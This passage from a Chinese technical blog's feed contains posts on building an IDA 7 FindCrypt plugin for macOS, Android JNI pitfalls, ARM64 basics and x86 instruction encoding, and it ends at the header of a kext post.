alt="link_s"></p><p>这里连接的库为-lida64，表示我们编译的是解析64位的插件，若要编译解析32位的插件，这里为-lida即可。</p><p>最后我们还需要设置编译参数</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/macros_s.jpg?raw=true" alt="macros_s"></p><p>其中<code>__EA64__</code>在编译64位插件时才有。</p><p>这时候build一下，如果一切顺利，应该就不会报错了。</p><h3 id="最后说两句"><a href="#最后说两句" class="headerlink" title="最后说两句"></a>最后说两句</h3><p>IDA7相以前版本而言，插件的后缀名统一为dylib格式，之前32位为pmc，64位为pmc64。这里将编译好的插件改为<strong>findcrypt264.dylib</strong>表示为64位插件，则对应的32位插件名为<strong>findcry.dylib</strong></p><p>下面测试下效果，我们打开IDA去解析一个含有md4加密的macho文件，运行插件测试能否识别出其中的加密算法。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/test.jpg?raw=true" alt="test"></p><p>上图我们可以看到这里成功找到一处md4加密，反汇编窗口中正是md4加密中用到的常量数组。我顺便为插件注册了<strong>Ctrl-Alt-z</strong>的快捷键，若没有快捷键，可以在插件的导航栏里点击对应的插件即可。</p><h3 id="完"><a href="#完" class="headerlink" title="完"></a>完</h3><p>附上该插件，完。</p><p><a href="https://raw.githubusercontent.com/4ch12dy/4ch12dy.github.io/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/findcrypt264.dylib" target="_blank" rel="external">findcrypt264.dylib_for_ida7_made_by_x1a0</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><p><a href="http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html" target="_blank" rel="external">http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html</a></p></li><li><p><a href="http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/" target="_blank" rel="external">http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/</a></p></li><li><p><a href="https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile">https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile</a></p><p>​</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;先说两句&quot;&gt;&lt;a href=&quot;#先说两句&quot; class=&quot;headerlink&quot; title=&quot;先说两句&quot;&gt;&lt;/a&gt;先说两句&lt;/h3&gt;&lt;p&gt;前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因
      
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
      <category term="ida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>Android JNI踩坑笔记</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/28/Android_JNI_%E6%8E%89%E5%9D%91%E7%AC%94%E8%AE%B0%20/JNI/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/28/Android_JNI_掉坑笔记 /JNI/</id>
    <published>2017-11-28T09:00:20.000Z</published>
    <updated>2017-11-29T03:29:43.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。</p></blockquote></blockquote><h3 id="坑1–jni方法签名分号问题"><a href="#坑1–jni方法签名分号问题" class="headerlink" title="坑1–jni方法签名分号问题"></a>坑1–jni方法签名分号问题</h3><p>这是一个很常见的问题，第一次写jni中方法签名的时候很容易遇到这个错误，比如下面这个签名</p><pre><code class="c++">jmethodID equals_id = env-&gt;GetMethodID(string_c, &quot;equals&quot;, &quot;(Ljava/lang/Object;)Z&quot;);</code></pre><p>切记当参数或者返回值不是基本类型的时候一定要在末尾加上分号。</p><pre><code class="c++">jmethodID iterator_id = env-&gt;GetMethodID(list_c,&quot;iterator&quot;,&quot;()Ljava/util/Iterator;&quot;);</code></pre><p>这类错误常见描述为方法找不到错误。如果遇到类方法找不到切记先检查方法签名是否正确。</p><h3 id="坑2–原生方法包含默认2个参数"><a href="#坑2–原生方法包含默认2个参数" class="headerlink" title="坑2–原生方法包含默认2个参数"></a>坑2–原生方法包含默认2个参数</h3><p>这个坑当然是对jni使用不熟练造成的，未了解其特性，所以对于初学者来说容易犯。看一个原生函数</p><pre><code class="c++">static jboolean nativeFunction(JNIEnv *env, jobject content, jobject someObj){...}</code></pre><p>第一个保留参数为<code>JNIEnv</code>虚拟机环境变量，第二个为调用该原生方法的java类对象即上下文。这里多说一句，第二个参数的上下文需根据该方法为静态方法还是实例方法，若为静态方法，则这里上下文为类引用；若为实例方法，则上下文为该类的对象引用。若把类引用当做对象引用，在查找方法id时则会出现方法找不到错误。</p><p>由于很多时候不声明这两个参数同样能正确运行（无其他参数时）导致忽略了第二个参数的存在，以为第二个上下文参数为传入的对象引用。</p><p>这类错误常见描述为当你在某处调用这个对象的方法时，会提示找不到该方法。因为这个对象根本不是你传入的对象。</p><h3 id="坑3—jni调用父类方法的正确姿势"><a href="#坑3—jni调用父类方法的正确姿势" class="headerlink" title="坑3—jni调用父类方法的正确姿势"></a>坑3—jni调用父类方法的正确姿势</h3><p>这里就以一个正确的调用父类方法的流程来讲，起因是当我在查找<code>Exception</code>这个类的<code>getStackTrace</code></p><p>方法时提示方法找不到错误，调了会才发现这个方法是在其父类<code>Throwable</code>中，所以正确的写法为：</p><pre><code class="c++">    jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;);    jclass throwable_c = env-&gt;FindClass(&quot;java/lang/Throwable&quot;);    jmethodID getStackTrace_id = env-&gt;GetMethodID(throwable_c, &quot;getStackTrace&quot;,&quot;()[Ljava/lang/StackTraceElement;&quot;);</code></pre><p>那么怎么调用呢？用<code>CallNonvirtual&lt;XXX&gt;Method</code>去调用父类中的方法，一个调用例子：</p><pre><code class="c++">jobjectArray stes = (jobjectArray)env-&gt;CallNonvirtualObjectMethod(excep, throwable_c, getStackTrace_id);</code></pre><p>这里需要传入三个参数，第一个为子类的对象引用，第二个为父类类引用，第三个为方法id。</p><h3 id="坑4—其他小坑"><a href="#坑4—其他小坑" class="headerlink" title="坑4—其他小坑"></a>坑4—其他小坑</h3><p>写jni代码时最大的麻烦在于要写很多代码去定位java中的类和方法，java中一个很简单的调用，在jni层写时或许要写很大一堆，这也不奇怪，因为没有了Android虚拟机，这些本来由虚拟机做的事必须得手动去完成。在写jni层代码时，还有一些小的错误，比如<code>jstring</code>与<code>char*</code>的转换，<code>LOGE()</code>函数中参数为<code>char*</code>的字符串。当然还有一些java与C语言类型对应的问题就不多说了，自己翻下<code>jni.h</code>头文件就能找到。</p><p>还有个AndroidStudio的bug在于不能正确的解析jni等头文件，虽然不影响编译，但没有了代码提示以及显示红色看着也挺难受的。网上找到一个解决办法，在对应的<code>build.gradle</code>文件中在<code>defaultConfig{}</code>加入下面的脚本：</p><pre><code class="c">        sourceSets.main{            jni.srcDirs  &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-mips/usr/include&#39;            jniLibs.srcDir &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-arm/usr/lib&#39;        }</code></pre><p>无非是手动指定了jni相关的文件路径。</p><p>关于下面两类写法：</p><pre><code class="c++">jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;);</code></pre><pre><code class="c">jclass exception_c = (*env)-&gt;FindClass(env, &quot;java/lang/Exception&quot;);</code></pre><p>原因在于C++和C的两种写法，可以在文件中宏定义为C++的即可。</p><h3 id="完"><a href="#完" class="headerlink" title="完"></a>完</h3><p>说了这些坑，当然我都踩过，由于刚接触Android jni特性。所以踩了很多坑，尤其是Android不像iOS那样容易debug，多了一层虚拟机导致很多错误不好调式。说到这，还要吐槽下AndroidStudio的gradle这个项目管理器，各种版本或者莫名奇怪的错误，虽然Xcode同样不是很好用，但相比之下，Xcode省心多了。</p><p>继续踩坑去了…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h
      
    
    </summary>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>ARM64基础知识整理</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/21/ARM64%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/ARM64%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/21/ARM64基础知识整理/ARM64基础知识整理/</id>
    <published>2017-10-21T10:07:00.000Z</published>
    <updated>2019-03-08T07:07:58.360Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ARM64基础知识整理"><a href="#ARM64基础知识整理" class="headerlink" title="ARM64基础知识整理"></a>ARM64基础知识整理</h3><h4 id="Register"><a href="#Register" class="headerlink" title="Register"></a>Register</h4><h5 id="参数寄存器-X0-X7"><a href="#参数寄存器-X0-X7" class="headerlink" title="参数寄存器 (X0-X7)"></a>参数寄存器 (X0-X7)</h5><p>参数寄存器，在函数调用的时候传参使用。X0-X7分别对应8个参数，多于8个的参数保存在栈中。</p><h5 id="其他特殊寄存器"><a href="#其他特殊寄存器" class="headerlink" title="其他特殊寄存器"></a>其他特殊寄存器</h5><table><thead><tr><th style="text-align:center">X29(FP)</th><th style="text-align:center">栈帧寄存器  类比x64中rbp</th></tr></thead><tbody><tr><td style="text-align:center">X30(LR)</td><td style="text-align:center">链接寄存器，保存函数返回地址，x64该地址保存在栈中</td></tr><tr><td style="text-align:center">SP</td><td style="text-align:center">栈顶寄存器，类比x64中</td></tr><tr><td style="text-align:center">PC</td><td style="text-align:center">指向下一条指令</td></tr><tr><td style="text-align:center">寄存器</td><td style="text-align:center">描述</td></tr><tr><td style="text-align:center">CPSR</td><td style="text-align:center">状态寄存器</td></tr></tbody></table><h4 id="Instructions"><a href="#Instructions" class="headerlink" title="Instructions"></a>Instructions</h4><ul><li><code>mov</code></li></ul><pre><code class="assembly">  mov x0, x1; copies x1 into x0  mov x1, 0x4141; loads the value 0x4141 in x1</code></pre><ul><li><code>str/ldr</code></li></ul><pre><code class="assembly">str x0, [x29]; store x0 at the address in x29ldr x0, [x29]; load the value from the address in x29 into x0</code></pre><ul><li><code>stp/ldp</code></li></ul><pre><code class="assembly">stp x29, x30, [sp]; store x29 at sp and x30 at sp+8</code></pre><ul><li><code>b/br</code></li></ul><pre><code class="assembly"> br x0; jump to the address stored in x0</code></pre><ul><li><code>ret</code></li></ul><pre><code>Unlike it’s x86 equivalent which pops the return address from stack, it looks for the return address in the x30 register and jumps there.</code></pre><h4 id="Indexing-modes"><a href="#Indexing-modes" class="headerlink" title="Indexing modes"></a>Indexing modes</h4><ul><li>Immediate offset : <code>[base, #offset]</code> - Index an offset directly and don’t mess with anything else</li></ul><pre><code class="assembly">ldr x0, [sp, 0x10]; load x0 from sp+0x10</code></pre><ul><li>Pre-indexed : <code>[base, #offset]!</code> - Almost the same as above, except that base+offset is written back into base.</li></ul><pre><code class="assembly">ldr x0, [sp, 0x10]!; load x0 from sp+0x10 and then increase sp by 0x10</code></pre><ul><li>Post-indexed : <code>[base], #offset</code> - Use the base directly and then write base+offset back into the base</li></ul><pre><code class="assembly">ldr x0, [sp], 0x10; load x0 from sp and then increase sp by 0x10</code></pre><h4 id="函数调用demo分析"><a href="#函数调用demo分析" class="headerlink" title="函数调用demo分析"></a>函数调用demo分析</h4><pre><code class="assembly">__text:000000010004F0D4                 SUB             SP, SP, #0x70__text:000000010004F0D8                 STP             X24, X23, [SP,#0x60+var_30]__text:000000010004F0DC                 STP             X22, X21, [SP,#0x60+var_20]__text:000000010004F0E0                 STP             X20, X19, [SP,#0x60+var_10]__text:000000010004F0E4                 STP             X29, X30, [SP,#0x60+var_s0]__text:000000010004F0E8                 ADD             X29, SP, #0x60__text:000000010004F0EC                 MOV             X19, X0__text:000000010004F0F0                 ADRP            X8, #___stack_chk_guard_ptr@PAGE__text:000000010004F0F4                 LDR             X8, [X8,#___stack_chk_guard_ptr@PAGEOFF]__text:000000010004F0F8                 LDR             X8, [X8]__text:000000010004F0FC                 STR             X8, [SP,#0x60+var_38]__text:000000010004F100                 ADRP            X8, #classRef_Fabric@PAGE__text:000000010004F104                 LDR             X20, [X8,#classRef_Fabric@PAGEOFF]__text:000000010004F108                 NOP__text:000000010004F10C                 LDR             X0, [X8,#classRef_Crashlytics@PAGEOFF] ; void *__text:000000010004F110                 ADRP            X8, #selRef_class@PAGE__text:000000010004F114                 LDR             X1, [X8,#selRef_class@PAGEOFF] ; char *__text:000000010004F118                 BL              _objc_msgSend...__text:000000010004F2F4                 LDP             X29, X30, [SP,#0x60+var_s0]__text:000000010004F2F8                 LDP             X20, X19, [SP,#0x60+var_10]__text:000000010004F2FC                 LDP             X22, X21, [SP,#0x60+var_20]__text:000000010004F300                 LDP             X24, X23, [SP,#0x60+var_30]__text:000000010004F304                 ADD             SP, SP, #0x70__text:000000010004F308                 RET</code></pre><table><thead><tr><th style="text-align:center">地址</th><th style="text-align:center">栈值</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">sp=sp-0x70</td><td style="text-align:center"></td><td style="text-align:center">局部变量空间</td></tr><tr><td style="text-align:center">sp-0x60</td><td style="text-align:center"></td><td style="text-align:center">局部变量空间</td></tr><tr><td style="text-align:center">sp-0x50</td><td style="text-align:center"></td><td style="text-align:center">局部变量空间</td></tr><tr><td style="text-align:center">sp-0x40</td><td style="text-align:center">X24/X23</td><td style="text-align:center">保存寄存器信息</td></tr><tr><td style="text-align:center">sp-0x30</td><td style="text-align:center">X22/X21</td><td style="text-align:center">保存寄存器信息</td></tr><tr><td style="text-align:center">sp-0x20</td><td style="text-align:center">X20/X19</td><td style="text-align:center">保存寄存器信息</td></tr><tr><td style="text-align:center">X29 –&gt; sp-0x10</td><td style="text-align:center">X29/X30</td><td style="text-align:center">保存前栈基址和返回地址</td></tr><tr><td style="text-align:center">sp=sp</td><td style="text-align:center"></td><td style="text-align:center">调用前的栈顶地址</td></tr></tbody></table><h4 id="Arm32"><a href="#Arm32" class="headerlink" title="Arm32"></a>Arm32</h4><p><img src="https://azeria-labs.com/downloads/cheatsheetv1.2-1920x1080.png" alt="arm32"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://www.jianshu.com/p/2f4a5f74ac7a" target="_blank" rel="external">https://www.jianshu.com/p/2f4a5f74ac7a</a></li><li><a href="https://wiki.cdot.senecacollege.ca/wiki/Aarch64_Register_and_Instruction_Quick_Start" target="_blank" rel="external">https://wiki.cdot.senecacollege.ca/wiki/Aarch64_Register_and_Instruction_Quick_Start</a></li><li><a href="https://blog.perfect.blue/ROPing-on-Aarch64" target="_blank" rel="external">https://blog.perfect.blue/ROPing-on-Aarch64</a></li><li><a href="https://azeria-labs.com/assembly-basics-cheatsheet/" target="_blank" rel="external">https://azeria-labs.com/assembly-basics-cheatsheet/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ARM64基础知识整理&quot;&gt;&lt;a href=&quot;#ARM64基础知识整理&quot; class=&quot;headerlink&quot; title=&quot;ARM64基础知识整理&quot;&gt;&lt;/a&gt;ARM64基础知识整理&lt;/h3&gt;&lt;h4 id=&quot;Register&quot;&gt;&lt;a href=&quot;#Register&quot;
      
    
    </summary>
    
      <category term="assembly" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/assembly/"/>
    
    
      <category term="ARM64" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ARM64/"/>
    
  </entry>
  
  <entry>
    <title>X86指令编码笔记</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/11/x86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/10/11/x86指令编码笔记/X86指令编码笔记/</id>
    <published>2017-10-11T03:46:13.000Z</published>
    <updated>2019-02-21T10:03:24.082Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>由于重装系统同步导致原文章消失，只能再写一遍，方便以后查阅。</p></blockquote><h3 id="x86指令编码格式"><a href="#x86指令编码格式" class="headerlink" title="x86指令编码格式"></a>x86指令编码格式</h3><p>很多时候我们都是查阅指令参考页去了解一个指令的含义，但这并不能理解指令的编码格式。而只有学会看懂opcode表的时候才是王道。</p><p>x86是一种CISC指令集，CISC的全称是“Complex Instruction Set Computer”，表示的是一种复杂的指令集，其中一个最重要的复杂性在于在这个指令集中，指令是不定长的，要使得CPU在这种不定长的指令集里面确定每一条指令的含义，就需要一种特定的指令格式，下图显示了<code>Intel 64</code>和<code>IA-32</code>架构下的指令格式，当然，这两种架构所采用的都是x86指令编码：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E6%A0%BC%E5%BC%8F.png?raw=true" alt="指令编码格式"></p><p>从上面可以看出，x86指令格式中，由6部分组成，但在这之中只有opcode是必须的，其余都是可选。我们稍后就介绍这些组成部分。</p><h3 id="指令prefix"><a href="#指令prefix" class="headerlink" title="指令prefix"></a>指令prefix</h3><p>prefix简单的说来就是调整内存操作数属性，增强指令的作用等。</p><ul><li><p><code>lock</code> 和 <code>repeat</code></p><p>其中，LOCK prefix保证该条指令对共享内存的访问是独占的；而repeat prefixes 表示这条指令会重复执行多次，直到某个条件满足位置。其中第二种repeat prefix只能用在对string的操作，或者对I/O的操作上。</p></li><li><p><code>operand-size override</code> （<strong>66H </strong>— 改变默认操作数大小）</p><p>这个prefix主要是在解析指令的操作数的时候，可以在十六位或者三十二位的操作数大小间进行切换。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/operand_size_override.png?raw=true" alt="operand_size_override"></p></li><li><p><code>address-size override</code> （<strong>67H</strong> — 改变默认操作数地址大小）</p><p>这个prefix主要是在进行指令寻址的时候，可以在十六位或者三十二位的地址大小中进行切换。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/address_override.png?raw=true" alt="address_override"></p></li><li><p><code>segment override</code>，<code>branch hints</code> 和 <code>bound</code></p><p>其中，segment override prefix会在执行这条指令的时候将默认的段寄存器给换掉；branch hints prefix主要应用在条件跳转指令（Jcc）中，可以协助CPU进行指令的prefetch；而bound prefix主要是用intel MPX硬件特性上。</p><p>​</p><p>| 2E          | 3E          | 26          | 64          | 65          | 36          |<br>| ———– | ———– | ———– | ———– | ———– | ———– |<br>| CS register | DS register | ES register | FS register | GS register | SS register |</p></li></ul><h4 id="REX-prefix—开启-64-位计算的基石"><a href="#REX-prefix—开启-64-位计算的基石" class="headerlink" title="REX prefix—开启 64 位计算的基石"></a>REX prefix—开启 64 位计算的基石</h4><p>REX prefix 是不定值，它的取值范围是：40 - 4F （共 16 个）</p><table><thead><tr><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>0</td><td>0</td><td>W</td><td>R</td><td>X</td><td>B</td></tr></tbody></table><ul><li>W: operand width 标志位，当 W = 0 时使用 default operand size,当 W = 1 时使用 64 位 operand size</li><li>R: 用来扩展 ModRM.reg 域</li><li>X: 用来扩展 SIB.index 域</li><li>B: 用来扩展 SIB.base, ModRM.r/m 以及 Opcode.reg</li></ul><h5 id="寄存器编码表"><a href="#寄存器编码表" class="headerlink" title="寄存器编码表"></a>寄存器编码表</h5><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/register_table.png?raw=true" alt="register_table"></p><p>下面来分析这条指令：</p><p><code>mov eax,ebx</code></p><p>正常编码为：<code>89 d8</code>  下面看看在不同的<code>REX.W</code>和<code>66H prefix</code>下的不同：</p><ul><li><p><code>48 89 d8</code>——————&gt; <code>mov rax,rbx</code></p></li><li><p><code>66 48 89 d8</code>—————&gt; <code>mov rax,rbx</code></p></li><li><p><code>66 40 89 d8</code>—————&gt; <code>mov ax, bx</code></p><p>​</p></li></ul><p>第 1 条指令编码使用 REX prefix 扩展访问 64 位寄存器，<strong>REX.W = 1</strong></p><p>第 2 条指令编码加上了 <strong>66H prefix</strong> 同时还有 REX prefix（<strong>REX.W = 1</strong>），此时一般会认为产生了冲突：是使用 64 位还是 16 位 operand size 呢？<br>实际上，很简单！<strong>48H 位于 66H 后面，66H 将被覆盖！</strong>也就是说：66H prefix 将会被忽略，REX prefix 产生了作用！因此：指令的 <strong>operand size 是 64 位</strong>的。</p><p>第 3 条指令编码也同样使用了 <strong>66H prefix </strong>和 <strong>REX prefix</strong>，但是 <strong>REX.W = 0</strong> 意味着不改变原来的 operand size！<br>在这种情况下，<strong>REX prefix 不会与 66H prefix 产生冲突</strong>，最终的作用于 66H prefix，因此 <strong>operand size 是 16 位</strong>的。</p><h3 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h3><p>整个编码中opcode是必须的，因为代表着这条指令的含义，整个指令的核心，且prefix与Opcode共享00~FF的空间。</p><p>一个opcode可以由一个byte组成，我们称之为<code>1-byte opcode</code>，当然，与之对应的，就有<code>2-bytes opcode</code>和<code>3-bytes opcode</code>。其中，后两者一般会有一个被称为<code>escape opcode</code>的byte进行引导，该byte的数值是<code>0FH</code>。所以，一般情况下，<code>2-bytes opcode</code>就是<code>0FH</code>后面再加一个byte，而<code>3-bytes opcode</code>就是<code>0FH</code>后面再加两个bytes。</p><h3 id="ModR-M"><a href="#ModR-M" class="headerlink" title="ModR/M"></a>ModR/M</h3><p>ModRM在指令中非常重要，是理解x86平台opcode的关键，决定着寻址模式。</p><p>由一个byte组成，其格式如下：</p><table><thead><tr><th>7 6</th><th>5 4 3</th><th>2 1 0</th></tr></thead><tbody><tr><td>mod</td><td>reg</td><td>R/M</td></tr></tbody></table><p><strong>1、mod：寻址模式。</strong><br>　　2位组成4种寻址模式，总的来说，只有两种寻址模式，就是：内存寻址模式和寄存器寻址模式。</p><ul><li>mod = 11指出寄存器寻址模式，mod = 00 ~ 10 时指出内存寻址模式：</li></ul><ul><li>mod = 00，定义 [register] 间接寻址，无displacement值。</li><li>mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。</li><li>mod = 10，定义 [register + disp32]，有32位displacement偏移值。</li></ul><p><strong>2、reg：寄存器ID值</strong><br>　　3位组成8个寄存器ID值，从 000 ~ 111，对应于 RAX、RCX、RDX、RBX、RSP、RBP、RSI以及RDI。这个ID值可以被REX prefix扩充为4位，范围从 0000 ~ 1111可表示16个寄存器。</p><p>reg域的另一含义是对Opcode的补充，对分为一组Opcode的进行选择（Group属性）。</p><p><strong>3、r/m：意即register / memory。</strong></p><p>​     提供对registers或memory的寻址，也用来表示寄存器ID，当是registers时是寄存器ID值。当是memory时是寄存器间接寻址中的寄存器ID值。当mod != 11 时，r/m 表示 [rax] ~ [rdi]，REX prefix用来扩充寄存器ID值。</p><blockquote><p>注意:</p><p>(1) 如果像这条指令：mov eax, [eax+ecx<em>2+0x0c] 在这条指令里eax是base寄存器，ecx是Index寄存器，2是scale，还有一个displacement ,这种内存寻址是base+index</em>scale+disp。这需要SIB字节来进行确定，那么ModRM必须要有一个手段来引出后续的SIB字节。在 [rax] ~ [rdi] 的范围里，Intel选择了原来应属于 [rsp] 的值用来引出SIB，一是因为 [rsp] 并不常用吧。二是因为 rsp 设计为 stack top指针，专用于stack top指针。<br>　　原来属于 [rsp] 的领域对应的，r/m是100，这个领域被 [SIB] 替代了，事实上在16位机器原本是没有SIB字节的，base+index*scale+disp这种寻址是后来才增加的。16位的ModRM上是没有SIB引导域。</p><p>(2)如果内存寻址中没有base和index，只有disp的话，如：mov ebx, [0x11223344]，这种直接寻址方式，在设计上ModRM还必须为提供这个模式。<br>　　Intel又作出修改，选择了原来属于 [rbp] 模式的领域提供给 [disp]，选择 [rbp] 让给 [disp]，是因为 rbp 原本意图就是设计为 stack基址指针。[rbp] 寻址一般都要加上一个偏移量，也就是基于stack frame指针的偏移量，即 [ebp + disp] 这种寻址模式在 mod = 01 或 mod = 10 中给出。</p></blockquote><h3 id="SIB"><a href="#SIB" class="headerlink" title="SIB"></a>SIB</h3><p>SIB意即：Scale – Index – Base，用来定义base+index*scale+disp这种寻址模式。同样按2-3-3比例组合。</p><table><thead><tr><th>7-6</th><th>5-4-3</th><th>2-1-0</th></tr></thead><tbody><tr><td>scale</td><td>index</td><td>base</td></tr></tbody></table><p>index 域指出index寄存器的ID值，范围从 000 ~ 111。base 域指出base寄存器的ID 值，从 000 ~ 111。Index与base经过 REX prefix可以扩展为0000 ~ 1111。</p><h3 id="Displacement-和-Immediate"><a href="#Displacement-和-Immediate" class="headerlink" title="Displacement 和 Immediate"></a>Displacement 和 Immediate</h3><p>某些指令会在最后要求有一个用于计算内存地址的值，或者一个立即数。很明显，不多说。</p><h3 id="综合起来，看下面的例子："><a href="#综合起来，看下面的例子：" class="headerlink" title="综合起来，看下面的例子："></a>综合起来，看下面的例子：</h3><ul><li><p><code>49 8b 7d 00</code></p><p>49=0100 1001对应REX prefix,默认64为size模式</p><p>8b= mov opcode</p><p>7d=01 111 101—&gt;ModR/M   mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。rdi ,r13</p><p>00=Displacement = 0</p><p>所以指令= mov rdi,QWORD PTR [r13+0]—&gt;mov rdi,[r13]</p><p>​</p></li></ul><h3 id="参考及索引"><a href="#参考及索引" class="headerlink" title="参考及索引"></a>参考及索引</h3><p><a href="http://ref.x86asm.net/coder32.html" target="_blank" rel="external">http://ref.x86asm.net/coder32.html </a>—-&gt; 查阅opcode</p><p><a href="http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.png" target="_blank" rel="external">http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.png</a> —&gt;quick look</p><p><a href="http://sparksandflames.com/files/x86InstructionChart.html" target="_blank" rel="external">Intel x86 Assembler Instruction Set Opcode Table</a></p><p><a href="http://www.mouseos.com/x64/index.html" target="_blank" rel="external">http://www.mouseos.com/x64/index.html</a></p><p><a href="https://bbs.pediy.com/thread-78121.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-78121.htm</a></p><p><a href="http://ytliu.info/blog/2016/12/10/x86zhi-ling-bian-ma-de-na-xie-shi-er/" target="_blank" rel="external">X86指令编码的那些事儿</a></p><p><a href="http://subler.github.io/note/compiler/x86_instruction_encode.html" target="_blank" rel="external">http://subler.github.io/note/compiler/x86_instruction_encode.html</a></p><p><a href="https://www.onlinedisassembler.com/odaweb/strcpy_x86" target="_blank" rel="external">onlineDisassembler</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;由于重装系统同步导致原文章消失，只能再写一遍，方便以后查阅。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;x86指令编码格式&quot;&gt;&lt;a href=&quot;#x86指令编码格式&quot; class=&quot;headerlink&quot; title=&quot;x86指令编码格式
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="x86" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/x86/"/>
    
  </entry>
  
  <entry>
    <title>一种用户层与kext内核扩展交互方式</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/10/%E4%B8%80%E7%A7%8D%E7%94%A8%E6%88%B7%E5%B1%82%E4%B8%8Ekext%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95%E4%BA%A4%E4%BA%92%E6%96%B9%E5%BC%8F/%E4%B8%80%E7%A7%8D%E7%94%A8%E6%88%B7%E5%B1%82%E4%B8%8Ekext%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95%E4%BA%A4%E4%BA%92%E6%96%B9%E5%BC%8F/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/10/一种用户层与kext内核扩展交互方式/一种用户层与kext内核扩展交互方式/</id>
    <published>2017-08-10T07:59:00.000Z</published>
